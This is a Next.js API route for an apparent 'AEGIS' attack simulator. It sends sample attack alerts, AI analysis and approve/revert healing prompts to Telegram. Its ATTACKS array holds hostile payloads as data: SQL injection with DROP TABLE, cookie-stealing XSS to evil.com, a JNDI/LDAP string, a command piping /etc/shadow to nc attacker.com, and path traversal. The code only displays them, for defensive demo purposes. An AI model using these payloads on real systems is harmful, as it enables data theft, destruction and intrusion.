import { NextRequest, NextResponse } from "next/server";
import { sendMessage, getChatId, buildHealingMessage, buildHealingKeyboard } from "@/lib/telegram";
import { analyzeAttack } from "@/lib/deepseek";
import { registerHealing } from "@/lib/healingState";

function randomId() {
  return Math.random().toString(36).slice(2, 12);
}

const ATTACKS = [
  {
    type: "SQL Injection",
    severity: "Critical",
    payload: "' OR 1=1; DROP TABLE users; --",
    endpoint: "/api/auth/login",
    method: "POST",
  },
  {
    type: "XSS",
    severity: "High",
    payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    endpoint: "/api/search",
    method: "GET",
  },
  {
    type: "RCE",
    severity: "Critical",
    payload: "${jndi:ldap://attacker.com/exploit}",
    endpoint: "/api/webhook",
    method: "POST",
  },
  {
    type: "Command Injection",
    severity: "High",
    payload: "; cat /etc/shadow | nc attacker.com 4444",
    endpoint: "/api/export",
    method: "POST",
  },
  {
    type: "Path Traversal",
    severity: "High",
    payload: "../../../../etc/passwd",
    endpoint: "/api/files/upload",
    method: "GET",
  },
];

const PATCHES: Record<string, { patch: string; wafRule: string }> = {
  "SQL Injection": { patch: "WAF SQL Filter + Input Sanitizer", wafRule: "WAF-SQL-001" },
  "XSS": { patch: "CSP Header + Output Encoding", wafRule: "WAF-XSS-001" },
  "RCE": { patch: "Sandbox Isolation + Process Kill", wafRule: "WAF-RCE-001" },
  "Command Injection": { patch: "Command Sanitizer", wafRule: "WAF-CMD-001" },
  "Path Traversal": { patch: "Path Validator Middleware", wafRule: "WAF-PT-001" },
};

export async function POST(req: NextRequest) {
  const chatId = getChatId();
  if (!chatId) {
    return NextResponse.json({
      error: "TELEGRAM_CHAT_ID not set. Send /start to the bot, then call GET /api/telegram/setup to get your chat_id.",
    }, { status: 400 });
  }

  let body: { attackIndex?: number } = {};
  try {
    body = await req.json();
  } catch {
    // use defaults
  }

  const idx = body.attackIndex ?? Math.floor(Math.random() * ATTACKS.length);
  const attack = ATTACKS[idx % ATTACKS.length];
  const sourceIp = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
  const healingId = `heal_${randomId()}`;
  const patchInfo = PATCHES[attack.type] || { patch: "Generic Patch", wafRule: "WAF-GEN-001" };

  const results: Record<string, unknown> = {
    step1_attack: null,
    step2_ai_analysis: null,
    step3_healing_telegram: null,
  };

  // Step 1: Send attack alert to Telegram
  const alertText = `⚠️ <b>AEGIS Attack Detected</b>

<b>Type:</b> ${attack.type}
<b>Severity:</b> ${attack.severity}
<b>Source IP:</b> <code>${sourceIp}</code>
<b>Target:</b> <code>${attack.method} ${attack.endpoint}</code>
<b>Payload:</b> <code>${attack.payload}</code>

🔍 Running AI analysis...`;

  const alertResult = await sendMessage(chatId, alertText);
  results.step1_attack = { sent: alertResult.ok, attack: { ...attack, sourceIp } };

  // Step 2: AI Analysis via Deepseek
  try {
    const analysis = await analyzeAttack({
      type: attack.type,
      severity: attack.severity,
      payloadSnippet: attack.payload,
      targetEndpoint: attack.endpoint,
      method: attack.method,
      sourceIp,
    });

    const aiText = `🧠 <b>AI Analysis (Deepseek)</b>

<b>Threat Level:</b> ${analysis.threat_level}
<b>Confidence:</b> ${analysis.confidence}%
<b>False Positive:</b> ${analysis.is_false_positive_likely ? "Likely" : "Unlikely"}

<b>Analysis:</b>
${analysis.analysis}

<b>Recommendation:</b>
${analysis.recommendation}`;

    await sendMessage(chatId, aiText);
    results.step2_ai_analysis = analysis;
  } catch (err) {
    const errText = `❌ <b>AI Analysis Failed</b>\n\n${String(err)}`;
    await sendMessage(chatId, errText);
    results.step2_ai_analysis = { error: String(err) };
  }

  // Step 3: Self-Healing with HITL buttons
  const healingMsg = buildHealingMessage({
    id: healingId,
    attackType: attack.type,
    severity: attack.severity,
    patch: patchInfo.patch,
    wafRuleId: patchInfo.wafRule,
    sourceIp,
    targetEndpoint: attack.endpoint,
  });
  const keyboard = buildHealingKeyboard(healingId);
  const healResult = await sendMessage(chatId, healingMsg, keyboard);
  
  // Get the message_id from the response
  const telegramMessageId = healResult.ok ? healResult.result?.message_id : undefined;
  
  // Register in server-side store so Telegram callbacks can approve/reverse
  registerHealing({
    id: healingId,
    attackType: attack.type,
    severity: attack.severity,
    sourceIp,
    targetEndpoint: attack.endpoint,
    method: attack.method,
    payload: attack.payload,
    patch: patchInfo.patch,
    wafRuleId: patchInfo.wafRule,
    status: "Applied",
    appliedAt: Date.now(),
    reverseDeadline: Date.now() + 30 * 60 * 1000, // 30 min window
    telegramMessageId,
    telegramChatId: chatId,
  });

  results.step3_healing_telegram = {
    sent: healResult.ok,
    healingId,
    telegramMessageId,
    message: "Healing notification sent with Approve/Revert buttons",
  };

  return NextResponse.json({
    ok: true,
    message: "Full attack simulation completed. Check your Telegram!",
    results,
  });
}

export async function GET() {
  return NextResponse.json({
    message: "AEGIS Attack Simulator",
    usage: "POST /api/simulate with optional { attackIndex: 0-4 }",
    attacks: ATTACKS.map((a, i) => ({ index: i, type: a.type, severity: a.severity })),
  });
}
